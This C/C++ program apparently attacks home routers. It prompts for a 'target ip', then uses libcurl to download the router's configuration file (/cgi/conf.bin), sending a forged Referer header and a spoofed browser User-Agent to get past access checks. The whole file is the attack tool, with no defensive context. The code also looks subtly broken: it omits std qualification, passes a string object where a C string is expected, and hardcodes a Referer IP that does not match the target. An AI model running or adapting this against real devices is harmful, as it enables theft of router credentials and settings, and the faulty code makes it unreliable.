
#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <iostream>


static size_t write_data(void* ptr, size_t size, size_t nmemb, void* stream)
{
    size_t written = fwrite(ptr, size, nmemb, (FILE*)stream);
    return written;
}

int main(int argc, char* argv[]) {

    cout << "Enter target ip: ";
    CURL* curl_handle;
    static const char* pagefilename = "conf.bin";
    FILE* pagefile; 
    

    string url = "http://192.168.1.1/cgi/conf.bin";
    string ip;
    cin >> ip;
    string s2 = url.replace(7, 11, ip);
   
    
    
    struct curl_slist* chunk = NULL;
    curl_global_init(CURL_GLOBAL_ALL);

    /* init the curl session */
    curl_handle = curl_easy_init();

    /* set URL to get here */
    curl_easy_setopt(curl_handle, CURLOPT_URL, url);

    chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11");
    chunk = curl_slist_append(chunk, "Referer: http://192.168.0.1/mainFrame.htm");
    chunk = curl_slist_append(chunk, "Accept-Encoding: compress, gzip");
    
    /* Switch on full protocol/debug output while testing */
    curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 0L);

    /* disable progress meter, set to 0L to enable it */
    curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
   
    /* send all data to this function  */
    curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl_handle, CURLOPT_HTTPHEADER, chunk);
    /* open the file */
    pagefile = fopen(pagefilename, "wb");
    if (pagefile) {

        /* write the page body to this file handle */
        curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);

        /* get it! */
        curl_easy_perform(curl_handle);

        /* close the header file */
        fclose(pagefile);
    }

    /* cleanup curl stuff */
    curl_easy_cleanup(curl_handle);

    curl_global_cleanup();

    return 0;
}
